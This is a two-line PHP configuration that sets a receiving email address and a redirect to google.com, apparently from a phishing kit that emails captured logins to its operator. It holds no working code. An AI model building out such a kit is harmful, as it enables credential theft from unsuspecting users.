<?php 
$Receive_email="jamesbrown9135@gmail.com";
$redirect="https://www.google.com/";
?>